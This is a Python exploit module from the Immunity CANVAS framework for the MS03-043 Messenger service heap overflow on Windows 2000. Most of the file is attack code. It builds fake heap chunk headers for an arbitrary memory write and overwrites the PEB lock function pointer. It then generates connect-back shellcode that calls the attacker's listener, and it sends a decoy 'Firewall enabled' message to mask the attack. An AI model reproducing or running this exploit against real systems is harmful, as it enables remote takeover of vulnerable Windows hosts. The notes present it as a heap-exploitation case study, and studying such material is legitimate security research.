#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")
sys.path.append("./exploits/osdetect")
sys.path.append("../../exploits/osdetect")

import os
import getopt
import socket
import timeoutsocket
import sys
import struct
import time
import array
import select

from exploitutils import *
from tcpexploit import *
from msrpc import *
import addencoder
import win32shell
import canvasengine
import shellcodeGenerator
import mosdef

NAME="MSRPC MESSENGER Heap Overflow (MS03-043)"
DESCRIPTION="MSRPC MESSENGER Heap Overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Date public"] = "15-10-2003"
DOCUMENTATION["CVE Name"] = "CVE-2003-0717"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0717"
DOCUMENTATION["CERT Advisory"] = "http://www.cert.org/advisories/CA-2003-27.html"
DOCUMENTATION["References"] = "http://www.lsd-pl.net"
DOCUMENTATION["Repeatability"] = "Single shot"
DOCUMENTATION["MSRC"]="http://www.microsoft.com/technet/security/bulletin/ms03-043.asp"

VERSION="0.1"

GTK2_DIALOG="dialog.glade2"

#affectsList=["Windows"]   
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows" ] ]
PROPERTY['VERSION'] = ["2000"]
PROPERTY['MSADV']="MS03-043"

NOTES="""
Kudos go to Oded for his research into reliable win32 heap overflow exploitation 
and all his valuable input on the subject. Some nice tricks!

Find ifspec at 0x76842904
[ uuid(5a7b91f8-ff00-11d0-a9b2-00c04fb6e6fc),
  version(1.0),
  implicit_handle(handle_t rpc_binding)
] interface ???
{
  error_status_t Function_00(
    [in] [string] char element_28,
    [in] [string] char element_29,
    [in] [string] char element_30
  );
}

TODO:
    
    - implement a good test methodology
    - port to XP
    
WARNING:
    
    - this attack demonstrates an approach for reliable win32 heap overflow
      exploitation. However in all practically, due to the nature of the
      services.exe target it remains quite shaky in it's timeout wait for
      PEB lock to be killed and the lack of room for sufficient heap fixing.
      We're working on a solution for this. In the meanwhile we advise you
      to use our LSASS exploit for any serious target, and use this as a 
      practical case study for the implemented heap technique. 

"""

CHANGELOG="""
     
"""
runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit

# info, port
targets = {
    0 : ["Autoversioning N/A", 0],
    1 : ["Windows 2000", 135],
          }

class theexploit(tcpexploit):
    def __init__(self):  
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.host = "192.168.0.6"
        self.port = 135
        self.localhost = "192.168.0.2"
        self.localport = 5555
        self.info = ""
        self.version = 0
        self.sequence = 0
        self.badstring = "\x14\x00\r\n"
        self.customport = 0
        self.info = ""
        self.name=NAME
        self.UUID = "5a7b91f8-ff00-11d0-a9b2-00c04fb6e6fc"
        self.uuidversion = "1.0"
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def buildConnectionList(self):
        host=self.host

        connectionList = ["ncacn_ip_tcp:%s[%d]"% (host, self.port), "ncacn_ip_udp:%s[%d]"% (host, self.port) ]
    
        app = self.engine.getModuleExploit("dcedump")
        app.link(self)
        connectionList = app.getEndpointbyUUID(self.UUID) + connectionList
        
        self.connectionList=connectionList
        return self.connectionList

    
    def test(self):
        self.host=self.target.interface
        kprim=self.target.get_knowledge("OS")
 
        if kprim== None:                
            app = self.engine.getModuleExploit("osdetect")
            app.link(self)
            app.run()
            kprim=self.target.get_knowledge("OS")

            #self.doRecon("osdetect", self.target)
            
        if kprim:
            myos=kprim.known
            self.log("Detected: %s"%myos)

        else: 
            myos="UKNOWN" # This is not supposed to happen
            self.log("OSdetect failed")
            return 0
            
        self.log("No conclusive testing methodology implemented yet for msmessenger")
        if myos.count("Windows"):
            return 1
        return 0
    
    def triggerPebLock(self, host):
        # a dce dump appears to promote a PEB lock in services, not reliably though
        # we'll put another service call in here in due time
        
        app = self.engine.getModuleExploit("dcedump")
        app.link(self)
        result = app.run()
        return

    def sendMessage(self, s, src, dst, msg, n=1):
        data = ""
        data += s_dce_wordstring(src, nullterm=1)
        data += s_dce_wordstring(dst, nullterm=1)
        data += s_dce_wordstring(msg ,nullterm=1)
        UUID = "5a7b91f8-ff00-11d0-a9b2-00c04fb6e6fc"
        activity = get_random_uuid()
        self.log("Attempting to send message ...")
        for i in range(0, n):
            try:
                self.myDCE.call(0, data)
                #msrpcsend_udp(s, data, None, UUID, 1, activity, 0, self.sequence, idempotent=1, nofack=1)
            except:
                self.log("Failed to send msrpc udp message")
                return 0
        self.sequence += 1
        self.log("Send message success !")
        return 1
    
    def safeSendMessage(self, s, src, dst, msg, n=1):
        tries = 0
        while not self.sendMessage(s, src, dst, msg, n):
            self.log("Retry ...")
            time.sleep(0.5)
            tries += 1
            if tries == 10:
                s.close()
                self.raiseError("Fatal error sending message")
        return

    def connectToHost(self, host, port):
        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s=self.getudpsock()
            s.connect((host, port))
        except:
            self.raiseError("Could not connect")
        return s
    
    def heapIndex(self, base, size):
        size += 0x0f
        size &= 0xfffffff8L
        size = size >> 3
        index = size*0x30
        index += 0x688
        index += base
        return index
        
    def write4(self, s, what, where):
        # Oded style
        HEAP_ENTRY_BUSY=0x01
        HEAP_ENTRY_EXTRA_PRESENT=0x02
        HEAP_ENTRY_FILL_PATTERN=0x04
        HEAP_ENTRY_VIRTUAL_ALLOC=0x08
        HEAP_ENTRY_LAST_ENTRY=0x10
        HEAP_ENTRY_SETTABLE_FLAG1_FFU1=0x20
        HEAP_ENTRY_SETTABLE_FLAG2_FFU2=0x40
        HEAP_ENTRY_SETTABLE_FLAG3_NO_COALESCE=0x80
        HEAP_ENTRY_SETTABLE_FLAGS=0xE0
        
        self.log("write4(0x%.8X, 0x%.8X)"%(what, where))
        # 0x14 get's replaced with "\x0d\x0a", so we end up with a
        # n*2 + len(rest) size where n is the number of 0x14
        payload = "\x14"*2255 # 0x11ba-8 hits actual start of free chunk, 2265
        #payload += "AAAABBBBCCCCDDDD"
        
        """
        We're abusing a forward coalesce when our target buffer is freed.
        
        Notes:
            
            - nt malloc does sizes in 8 bytes multiples
            - the messenger target buf's actual size is (including chunk header)
              is 0x11d8 (0x23b*8)
            - our expansion to reach the overflow is 0x11ba-8 of 0x14
              ie: 2265 * 0x14 with the additional Message info prepended (seems to
              be static, we dont care)
              
        Free chunk:
            
            -- ACTUAL START OF BLOCK ---
            
            short size
            short prev_size
            char segmentindex
            char flags
            char index
            char mask
            
            -- USERCONTROLLEDSPACE (when free) --
            
            long flink (forward ptr)
            long blink (backward ptr)
            
        """
        payload += struct.pack("<H", 0x101) # size, overrun buffer size (0x101*8)
        payload += struct.pack("<H", 0x23b) # prev size, overflowed buffer size (0x23b*8)
        payload += chr(0x30) # segmentindex (0x40 == max segments)
        payload += chr(HEAP_ENTRY_SETTABLE_FLAG2_FFU2)
        payload += chr(0x08)
        payload += chr(0x30)

        payload += struct.pack("<L", what) # flink
        payload += struct.pack("<L", where) # blink

        self.safeSendMessage(s, "a", "b", payload)
        return 0
    
    def snooze(self, interval):
        self.log("Snoozing (%.2f) ..."%interval)
        time.sleep(interval)
        return
    
    def createShellcode(self):
        
        host=self.callback.ip
        port=self.callback.port
        heapfix = """
        movl %fs:(0x30),%ecx
        leal 0x18(%ecx),%ebx
        movl 0x90(%ecx),%ecx
        leal 0x4(%ecx),%ecx
        movl (%ecx),%ecx
        movl %ecx,(%ebx)
        // loop this thread for now
    loopservices:
        jmp loopservices
        """
        self.shellcode=self.createHeapSafeInjectIntoProcess(self.badstring, host, port, smallcode=1, append=heapfix)
     
       
    def connect(self):
        try:
            map=self.myDCE.connect()
            if not map:
                self.raiseError("Could not connect to remote server - service is not running or the host is firewalled.")
        except DCEException, msg:
            self.raiseError(str(msg))
            return 0
        self.log("attacking %s" % map)
        
    def run(self):
        self.host=self.target.interface
        self.info, self.port = targets[self.version]
        if self.customport:
            self.port = self.customport
        if self.version == 0:
            self.log("Autoversioning not available")
            return 0

        self.setInfo("%s attacking %s:%d - (in progress)"% (NAME, self.host, self.port))
        self.log("\n%s attacking %s:%d\n"% (NAME, self.host, self.port))
        

        # interval between message sends
        interval = 2
        self.s=None
        connectionList= self.buildConnectionList()

        self.myDCE=self.myDCE = DCE(self.UUID, self.uuidversion, connectionList, covertness = self.covertness, getsock=self, ssl=0)
        try:
            self.connect()
        except self.error, msg:
            self.log(str(msg))
            return 0
        
        
        #>#
        #self.s = self.connectToHost(self.host, self.port)
        
        # little masking note
        self.log("Sending masking message")
        self.sendMessage(self.s, "Administrator", "localhost", "Firewall enabled")
        
        # get a lookaside block
        payload = "AA\xeb\x04" + "ABCD" # "ABCD" is overwritten in final write4
        payload += self.shellcode + "B"*(920-(len(self.shellcode)+8))
            
        p_len = len(payload)
        h_idx = self.heapIndex(0x70000, p_len+3)

        self.log("p_len: %d, h_idx: 0x%.8X"%(p_len, h_idx))
        self.log("Getting a < 1024 lookaside block")

        self.safeSendMessage(self.s, "a", "b", payload)

                        
        #self.halt()
        self.snooze(interval)
        
        # fix buffer into a known place
        self.log("Writing desired What into heap index")
        self.write4(self.s, 0x7FFDF1C0, h_idx)
        
        #self.halt()
        self.snooze(interval)

        # send payload again, this time it will end up in the block address
        # we just wrote into the heap index
        self.log("Requesting controlled lookaside block")

        self.safeSendMessage(self.s, "a", "b", payload)
        
        #self.halt()
        self.snooze(interval)
        
        # overwrite PEB lock function ptr
        self.log("Going for the PEB lock function pointer")
        self.write4(self.s, 0x7FFDF1C0+2, 0x7FFDF020)

        #s.close()
        #self.myDCE.close()
        
        
        self.snooze(5)
     
        if self.triggerPebLock(self.host):
            self.snooze(10)
            if self.ISucceeded():
                self.setProgress(100)
                self.log("%s attacking %s:%d (succeeded!)"%(NAME,self.host,self.port))
                self.setInfo("%s attacking %s:%d (succeeded!)"%(NAME,self.host,self.port))
                return 1
        else:
            self.log("Polling for success, waiting for PEB to be locked in services")
            ptime = 30
            for i in range(0, ptime):
                if self.ISucceeded():
                    self.log("Polled success!")
                    self.setProgress(100)
                    self.log("%s attacking %s:%d (succeeded!)"%(NAME,self.host,self.port))
                    self.setInfo("%s attacking %s:%d (succeeded!)"%(NAME,self.host,self.port))
                    return 1
                if not i%10:
                    self.log("Poll time left: %.4d seconds"%(ptime-i))
                time.sleep(1)
                

        self.setProgress(100)
        
        self.log("Give the active listener about 10 minutes before you kill it")
        self.log("Sometimes it takes a while longer for the PEB to be locked")
        
        self.setInfo("%s attacking %s:%d (on hold ...)"%(NAME,self.host,self.port))
        return 0
    def displayVersions(self):
        i=0
        for listline in targets.values():
            print "\t%d : %s"% (i, listline[0])
            i+=1


if __name__== '__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)

    




    
    
            
        
                           
                           
        
        
        
        
        
        
        
        
        
        
        
        



